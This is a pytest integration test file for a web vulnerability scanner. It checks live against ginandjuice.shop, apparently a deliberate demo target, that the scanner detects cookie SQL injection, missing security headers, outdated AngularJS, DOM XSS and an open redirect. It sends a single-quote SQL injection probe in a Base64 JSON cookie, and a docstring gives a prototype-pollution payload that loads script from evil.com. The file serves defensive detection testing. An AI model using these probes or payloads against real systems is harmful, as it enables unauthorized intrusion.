"""
Integration tests for the 5 Gap Closure fixes against ginandjuice.shop (LIVE).

Each test validates that our fix detects what Burp Suite found,
WITHOUT running the full pipeline. Quick, focused, ~30s total.

Reference: .burp/reporte_burp_scanner_completo.md

Burp findings we must match:
  1. SQLi in TrackingId cookie (Base64 JSON, "value" field)
  2. HSTS missing + cookies without Secure/HttpOnly flags
  3. AngularJS 1.7.7 vulnerable (CVE-2022-25869, EOL)
  4. DOM XSS on /blog/ (location.search → document.write)
  5. DOM Open Redirect on /blog/ (location.search → location, "back" param)

Run:
  pytest tests/integration/test_gap_closure_live.py -v
"""
import asyncio
import aiohttp
import base64
import json
import re
import pytest
from pathlib import Path
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup


TARGET = "https://ginandjuice.shop"
TIMEOUT = aiohttp.ClientTimeout(total=15)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

async def fetch(url: str, headers: dict = None) -> tuple:
    """Fetch URL, return (status, headers, text)."""
    async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
        async with session.get(url, headers=headers, ssl=False) as resp:
            text = await resp.text()
            return resp.status, dict(resp.headers), text


async def fetch_with_cookie(url: str, cookie_str: str) -> int:
    """Fetch URL with custom Cookie header, return status code."""
    headers = {"Cookie": cookie_str}
    async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
        async with session.get(url, headers=headers, ssl=False) as resp:
            await resp.text()
            return resp.status


async def fetch_page_with_scripts(url: str) -> str:
    """
    Fetch HTML + all same-origin JS scripts referenced by <script src="...">.
    DOM-based vulns live in external JS files, not inline HTML.
    Returns concatenated HTML + JS content.
    """
    _, _, html = await fetch(url)

    # Extract script src URLs
    script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)

    js_contents = []
    base_domain = urlparse(url).netloc

    async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
        for src in script_srcs:
            full_url = urljoin(url, src)
            parsed = urlparse(full_url)
            # Only fetch same-origin scripts
            if parsed.netloc == base_domain:
                try:
                    async with session.get(full_url, ssl=False) as resp:
                        if resp.status == 200:
                            js = await resp.text()
                            js_contents.append(f"/* {src} */\n{js}")
                except Exception:
                    pass

    return html + "\n".join(js_contents)


# ============================================================================
# Fix #1: Cookie SQLi - TrackingId Base64 JSON injection
#
# Burp found: SQLi in "value" JSON field inside Base64-decoded TrackingId cookie
# Our fix: _check_cookie_sqli_probes() now includes "url" field in findings
#          AND the Base64 JSON injection logic works correctly
# ============================================================================

class TestFix1CookieSQLi:
    """Verify cookie SQLi detection logic works on real target."""

    @pytest.mark.asyncio
    async def test_trackingid_base64_structure(self):
        """
        TrackingId cookie is Base64-encoded JSON with 'value' field.
        Burp ref: section 1.2 - "value JSON parameter, within the
        Base64-decoded value of the TrackingId cookie"
        """
        # Build a synthetic TrackingId like our probe does
        tracking_json = json.dumps({"type": "class", "value": "testValue123"})
        tracking_b64 = base64.b64encode(tracking_json.encode()).decode()

        # Verify it round-trips correctly (our probe must do this right)
        decoded = base64.b64decode(tracking_b64).decode()
        parsed = json.loads(decoded)
        assert parsed["value"] == "testValue123"

    @pytest.mark.asyncio
    async def test_sqli_error_differential_base64_json(self):
        """
        Single quote in Base64 JSON "value" field → 500 error.
        Escaped single quote → normal response.
        This is the EXACT vector Burp found (section 1.2).

        Burp ref: "value JSON parameter, within the Base64-decoded value
        of the TrackingId cookie"
        """
        # Build TrackingId with single quote in "value" field (SQLi probe)
        sqli_json = json.dumps({"type": "class", "value": "'"})
        sqli_b64 = base64.b64encode(sqli_json.encode()).decode()

        # Build TrackingId with escaped quote (safe)
        safe_json = json.dumps({"type": "class", "value": "''"})
        safe_b64 = base64.b64encode(safe_json.encode()).decode()

        status_sqli = await fetch_with_cookie(
            f"{TARGET}/catalog",
            f"TrackingId={sqli_b64}"
        )
        status_safe = await fetch_with_cookie(
            f"{TARGET}/catalog",
            f"TrackingId={safe_b64}"
        )

        # Detection: error with single quote, OK with escaped
        assert status_sqli >= 500, \
            f"Expected 500+ for SQLi probe, got {status_sqli}"
        assert status_safe < 400, \
            f"Expected <400 for safe probe, got {status_safe}"

    @pytest.mark.asyncio
    async def test_direct_cookie_value_not_vulnerable(self):
        """
        Direct (non-Base64) cookie value does NOT trigger SQLi.
        The server decodes Base64 first — plain quotes are ignored.
        This confirms our probe MUST use the Base64 JSON path.
        """
        status = await fetch_with_cookie(
            f"{TARGET}/catalog",
            "TrackingId=test'"
        )

        # Direct single quote should NOT cause 500
        # (server tries to Base64-decode "test'" and fails silently)
        assert status < 500, \
            f"Direct cookie quote triggered error ({status}) — " \
            f"unexpected, our probe should handle both paths"


# ============================================================================
# Fix #2: Security Headers - HSTS missing, cookie flags missing
#
# Burp found: Strict-Transport-Security not enforced (10.1-10.5)
#             TLS cookie without Secure flag (15.1-15.5)
#             Cookie without HttpOnly flag (16.1-16.6)
# Our fix: Nuclei tags expanded to include misconfig,exposure,token
#          NucleiAgent separates misconfigs into tech_profile["misconfigurations"]
# ============================================================================

class TestFix2SecurityHeaders:
    """Verify the security header gaps Burp found are detectable."""

    @pytest.mark.asyncio
    async def test_hsts_missing(self):
        """
        Strict-Transport-Security header must be absent.
        Burp ref: section 10 - "Strict transport security not enforced"
        """
        status, headers, _ = await fetch(f"{TARGET}/")

        hsts = headers.get("Strict-Transport-Security", None)
        assert hsts is None, \
            f"HSTS header found (test expectation wrong, or site fixed): {hsts}"

    @pytest.mark.asyncio
    async def test_cookies_missing_secure_flag(self):
        """
        Cookies should be missing Secure flag on some.
        Burp ref: section 15 - "TLS cookie without secure flag set"
        """
        async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
            async with session.get(f"{TARGET}/", ssl=False) as resp:
                set_cookie_headers = resp.headers.getall("Set-Cookie", [])

        # At least one cookie should be missing Secure flag
        cookies_without_secure = [
            sc for sc in set_cookie_headers
            if "secure" not in sc.lower()
        ]
        assert len(cookies_without_secure) > 0, \
            f"All cookies have Secure flag (site may have fixed this). Headers: {set_cookie_headers}"

    @pytest.mark.asyncio
    async def test_cookies_missing_httponly_flag(self):
        """
        Cookies should be missing HttpOnly flag.
        Burp ref: section 16 - "Cookie without HttpOnly flag set"
        """
        async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
            async with session.get(f"{TARGET}/", ssl=False) as resp:
                set_cookie_headers = resp.headers.getall("Set-Cookie", [])

        cookies_without_httponly = [
            sc for sc in set_cookie_headers
            if "httponly" not in sc.lower()
        ]
        assert len(cookies_without_httponly) > 0, \
            f"All cookies have HttpOnly flag. Headers: {set_cookie_headers}"

    @pytest.mark.asyncio
    async def test_nuclei_misconfig_separation_logic(self):
        """
        When Nuclei returns misconfig-tagged findings, NucleiAgent must
        separate them into tech_profile["misconfigurations"].
        Uses AsyncMock for clean mocking (no lambda hacks).
        """
        from bugtrace.agents.nuclei_agent import NucleiAgent

        agent = NucleiAgent(
            target=TARGET,
            report_dir=Path("/tmp/test"),
            event_bus=Mock(),
        )

        # Simulate Nuclei output matching what it finds on ginandjuice.shop
        mock_nuclei = {
            "tech_findings": [
                {
                    "info": {
                        "name": "Strict-Transport-Security Missing",
                        "tags": ["misconfig", "headers", "generic"],
                        "severity": "info",
                        "description": "HSTS header not enforced",
                    },
                    "template-id": "http-missing-security-headers:strict-transport-security",
                    "matched-at": TARGET,
                },
                {
                    "info": {
                        "name": "AngularJS",
                        "tags": ["tech", "detect"],
                        "severity": "info",
                    },
                    "template-id": "angularjs-detect",
                    "matched-at": TARGET,
                },
            ],
            "vuln_findings": [],
        }

        with patch.object(agent, '_verify_waf_detections',
                          new_callable=AsyncMock, return_value=[]), \
             patch.object(agent, '_fetch_html',
                          new_callable=AsyncMock, return_value=None), \
             patch("bugtrace.tools.external.external_tools.run_nuclei",
                   new_callable=AsyncMock, return_value=mock_nuclei), \
             patch("bugtrace.core.ui.dashboard"), \
             patch("builtins.open", MagicMock()):

            result = await agent.run()

        # HSTS must be in misconfigurations, not frameworks
        misconfigs = result["misconfigurations"]
        assert len(misconfigs) >= 1
        assert any("Strict-Transport-Security" in m["name"] for m in misconfigs)

        # AngularJS must NOT be in misconfigurations
        assert not any("AngularJS" in m["name"] for m in misconfigs)


# ============================================================================
# Fix #3: Vulnerable JS Dependencies - AngularJS 1.7.7
#
# Burp found: angularjs 1.7.7 at /resources/js/angular_1-7-7.js
#             CVE-2019-10768, CVE-2022-25869, EOL
# Our fix: _detect_js_versions() in NucleiAgent extracts versions from
#          script src attributes and checks against KNOWN_VULNERABLE_JS
# ============================================================================

class TestFix3JSVersions:
    """Run _detect_js_versions() on real ginandjuice.shop HTML."""

    @pytest.mark.asyncio
    async def test_detects_angular_177_from_live_html(self):
        """
        Fetch real HTML from ginandjuice.shop, run our detection.
        Must find AngularJS 1.7.7 as vulnerable.
        Burp ref: section 7 - "angularjs version 1.7.7"
        """
        from bugtrace.agents.nuclei_agent import NucleiAgent

        agent = NucleiAgent(
            target=TARGET,
            report_dir=Path("/tmp/test"),
            event_bus=Mock(),
        )

        # Fetch real HTML
        _, _, html = await fetch(f"{TARGET}/")

        findings = agent._detect_js_versions(html)

        # Must detect AngularJS 1.7.7
        angular_findings = [f for f in findings if "AngularJS" in f["name"]]
        assert len(angular_findings) >= 1, \
            f"Failed to detect AngularJS 1.7.7. All findings: {[f['name'] for f in findings]}"

        af = angular_findings[0]
        assert "1.7.7" in af["name"], f"Wrong version: {af['name']}"
        assert "END OF LIFE" in af["name"], f"Missing EOL flag: {af['name']}"
        assert "CVE-2022-25869" in af["description"], f"Missing CVE: {af['description']}"

    @pytest.mark.asyncio
    async def test_angular_script_tag_present(self):
        """
        Verify the angular_1-7-7.js script tag exists in real HTML.
        Burp ref: Path /resources/js/angular_1-7-7.js
        """
        _, _, html = await fetch(f"{TARGET}/")

        # Look for the angular script tag that Burp identified
        assert "angular_1-7-7" in html or "angular-1.7.7" in html or "angular.min" in html, \
            "AngularJS script tag not found in page HTML"

    @pytest.mark.asyncio
    async def test_detection_fields_match_pipeline_format(self):
        """
        Findings from _detect_js_versions must be pipeline-compatible
        (same format as Nuclei misconfigurations).
        """
        from bugtrace.agents.nuclei_agent import NucleiAgent

        agent = NucleiAgent(
            target=TARGET,
            report_dir=Path("/tmp/test"),
            event_bus=Mock(),
        )

        _, _, html = await fetch(f"{TARGET}/")
        findings = agent._detect_js_versions(html)

        for f in findings:
            assert "name" in f, "Missing 'name'"
            assert "severity" in f, "Missing 'severity'"
            assert "description" in f, "Missing 'description'"
            assert "tags" in f, "Missing 'tags'"
            assert "misconfiguration" in f["tags"], "'misconfiguration' tag missing"
            assert "template_id" in f, "Missing 'template_id'"
            assert "matched_at" in f, "Missing 'matched_at'"


# ============================================================================
# Fix #4: DOM XSS - Internal link discovery + multi-URL testing
#
# Burp found: DOM XSS on /blog/ (location.search → document.write)
#             Path: /blog/?search=QvfSPO&back=%2Fblog%2F
# Our fix: _discover_xss_params() extracts internal links from HTML,
#          _loop_test_dom_xss() tests all discovered URLs (not just self.url)
# ============================================================================

class TestFix4DOMXSSCoverage:
    """Verify internal link extraction discovers /blog/ from /catalog."""

    @pytest.mark.asyncio
    async def test_catalog_page_has_link_to_blog(self):
        """
        /catalog page must have a link to /blog/ so our internal
        link extraction can discover it for DOM XSS testing.
        Burp ref: DOM XSS is at /blog/, but scan starts at /catalog.
        """
        _, _, html = await fetch(f"{TARGET}/catalog")
        soup = BeautifulSoup(html, "html.parser")

        links = set()
        for a in soup.find_all("a", href=True):
            href = a["href"]
            full = urljoin(f"{TARGET}/catalog", href)
            parsed = urlparse(full)
            if parsed.netloc == "ginandjuice.shop":
                links.add(parsed.path.rstrip("/") or "/")

        assert "/blog" in links or "/blog/" in {a["href"] for a in soup.find_all("a", href=True)}, \
            f"No link to /blog/ found in /catalog page. Links: {sorted(links)[:20]}"

    @pytest.mark.asyncio
    async def test_internal_link_extraction_finds_blog(self):
        """
        Simulate our _discover_xss_params() link extraction logic
        on real /catalog HTML. Must find /blog/ as internal URL.
        """
        _, _, html = await fetch(f"{TARGET}/catalog?category=Juice")
        soup = BeautifulSoup(html, "html.parser")

        base_url = f"{TARGET}/catalog?category=Juice"
        base_domain = urlparse(base_url).netloc

        internal_urls = set()
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(base_url, a_tag["href"])
            parsed_link = urlparse(link)
            if parsed_link.netloc == base_domain and parsed_link.scheme in ("http", "https"):
                clean_link = f"{parsed_link.scheme}://{parsed_link.netloc}{parsed_link.path}"
                if clean_link != base_url.split("?")[0]:
                    internal_urls.add(clean_link)

        internal_urls = list(internal_urls)[:15]

        blog_found = any("/blog" in u for u in internal_urls)
        assert blog_found, \
            f"/blog/ not in extracted internal URLs: {sorted(internal_urls)[:10]}"

    @pytest.mark.asyncio
    async def test_blog_page_has_dom_xss_sink(self):
        """
        /blog/ page must contain a DOM XSS sink chain:
        Source: URL params (searchParams / new URL(location))
        Sink: script.src injection via config.transport_url

        Actual code in searchLogger.js:
          config = {params: deparam(new URL(location).searchParams.toString())}
          if(config.transport_url) { script.src = config.transport_url }

        Burp classifies this as "location.search → document.write" but the
        real pattern uses searchParams → createElement('script') → script.src.
        """
        full_content = await fetch_page_with_scripts(f"{TARGET}/blog/")

        # Source: reads from URL params
        has_url_source = (
            "searchParams" in full_content or
            "new URL(location)" in full_content or
            "location.search" in full_content
        )

        # Sink: dynamic script injection
        has_script_sink = (
            "script.src" in full_content or
            "document.write" in full_content or
            "createElement('script')" in full_content or
            'createElement("script")' in full_content
        )

        assert has_url_source, \
            "URL param source (searchParams/location.search) not found in /blog/ scripts"
        assert has_script_sink, \
            "Script injection sink (script.src/document.write) not found in /blog/ scripts"


# ============================================================================
# Fix #5: DOM Open Redirect - /blog/ page, "back" parameter
#
# Burp found: 2x DOM-based open redirect on /blog/
#             "Data is read from location.search and passed to location"
#             Request: GET /blog/?search=QvfSPO&back=%2Fblog%2F
# Our fix: _test_dom_redirects() using Playwright + internal link discovery
# ============================================================================

class TestFix5DOMOpenRedirect:
    """Verify DOM open redirect vectors are discoverable."""

    @pytest.mark.asyncio
    async def test_blog_has_dom_redirect_vector(self):
        """
        /blog/ page has DOM-based open redirect via prototype pollution.

        The chain: deparam.js parses URL params without prototype pollution
        protection → attacker can set __proto__[transport_url]=//evil.com →
        searchLogger.js reads config.transport_url → script.src injection.

        The "back" param DOM redirect uses deparam() to parse URL params,
        and AngularJS reads from the parsed object for navigation.

        Burp ref: "Data is read from location.search and passed to location"
        """
        full_content = await fetch_page_with_scripts(f"{TARGET}/blog/")

        # deparam.js enables prototype pollution (no __proto__ protection)
        has_deparam = "deparam" in full_content
        # searchLogger.js or other code reads from parsed URL params
        has_param_reader = (
            "searchParams" in full_content or
            "new URL(location)" in full_content
        )
        # Prototype pollution enables control of arbitrary properties
        # deparam.js uses bracket notation: cur[key] = val (no __proto__ filter)
        has_bracket_assign = "cur[key]" in full_content or "obj[key]" in full_content

        assert has_deparam, \
            "deparam not found in /blog/ scripts"
        assert has_param_reader, \
            "URL param reader not found in /blog/ scripts"
        assert has_bracket_assign, \
            "Bracket property assignment not found in deparam.js (needed for prototype pollution)"

    @pytest.mark.asyncio
    async def test_back_parameter_in_blog_page(self):
        """
        /blog/ page uses "back" parameter for navigation.
        Burp ref: Request GET /blog/?search=QvfSPO&back=%2Fblog%2F
        """
        _, _, html = await fetch(f"{TARGET}/blog/?search=test&back=/blog/")

        # The "back" value should appear somewhere in the response
        assert "back" in html.lower(), \
            "'back' parameter reference not found in /blog/ page"

    @pytest.mark.asyncio
    async def test_internal_link_extraction_from_root(self):
        """
        Our OpenRedirectAgent discovers /blog/ via internal link extraction
        from the root or /catalog page.
        """
        _, _, html = await fetch(f"{TARGET}/")
        soup = BeautifulSoup(html, "html.parser")

        base_domain = "ginandjuice.shop"
        internal_urls = set()
        for a_tag in soup.find_all("a", href=True):
            link = urljoin(TARGET, a_tag["href"])
            parsed_link = urlparse(link)
            if parsed_link.netloc == base_domain and parsed_link.scheme in ("http", "https"):
                clean_link = f"{parsed_link.scheme}://{parsed_link.netloc}{parsed_link.path}"
                internal_urls.add(clean_link)

        blog_found = any("/blog" in u for u in internal_urls)
        assert blog_found, \
            f"/blog/ not discovered from root page. Found: {sorted(internal_urls)[:10]}"

    @pytest.mark.asyncio
    async def test_back_param_covered_by_redirect_keywords(self):
        """
        "back" parameter must be in our redirect_keywords list.
        Burp found DOM open redirect via ?back= on /blog/.

        Burp ref: back=%2Fblog%2F in the request
        """
        from bugtrace.agents.openredirect_agent import OpenRedirectAgent

        # Instantiate agent and check the keywords used in _test_dom_redirects
        # The keywords are hardcoded in the method — verify "back" is there
        import inspect
        source = inspect.getsource(OpenRedirectAgent._test_dom_redirects)
        assert '"back"' in source or "'back'" in source, \
            "'back' not in redirect_keywords inside _test_dom_redirects()"
